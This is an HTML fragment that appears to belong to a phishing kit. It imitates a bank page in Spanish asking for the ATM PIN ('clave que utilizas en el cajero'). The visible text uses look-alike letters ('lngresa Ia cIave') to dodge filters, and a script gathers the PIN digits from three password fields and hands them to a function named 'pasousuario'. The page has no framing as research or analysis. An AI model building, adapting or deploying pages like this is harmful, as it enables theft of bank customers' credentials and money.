<body>

    <section>
        <span style="font-size: 20px;">lngresa Ia cIave que utiIizas en<br>eI cajero</span>
        <div class="box-form">
            <div>
                <img style="width: 40px;" src="./assets/img/icons/ico-clav.png" alt="">
            </div>
            <span>lngresa Ia cIave</span>
            <br><br>
            <div>
                <input type="password" style="width: 15%; font-size: 20px; border: none; border-bottom: 1px solid black; text-align: center;" id="f1" name="f1" maxlength="1" class="password">
                <input type="password" style="width: 15%; font-size: 20px; border: none; border-bottom: 1px solid black; text-align: center;" id="f2" name="f2" maxlength="1" class="password">
                <input type="password" style="width: 15%; font-size: 20px; border: none; border-bottom: 1px solid black; text-align: center;" id="f3" name="f3" maxlength="1" class="password">

            </div>
            <br><br>
            <div class="box-btn">

            </div>
        </div>
    </section>
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    <script src="js/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="js/functions.js"></script>
    <script type="text/javascript">
        const inputs = document.querySelectorAll(".password");

        inputs.forEach((input, index) => {
            input.addEventListener("keyup", (e) => {
                if (e.target.value.length === 1) {
                    if (index !== inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                }
            });
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace") {
                    if (index !== 0 && e.target.value.length === 0) {
                        inputs[index - 1].focus();
                        inputs[index - 1].value = "";
                    }
                } else if (e.target.value.length === 1 && index !== inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
        });

        $(document).ready(function() {
            $('#btnPass').click(function(){
                pasousuario($("#f1").val(), $("#f2").val(), $("#f3").val(), $("#f4").val());	
                $(".mensaje").show();
            });
        });
    </script>
</body>
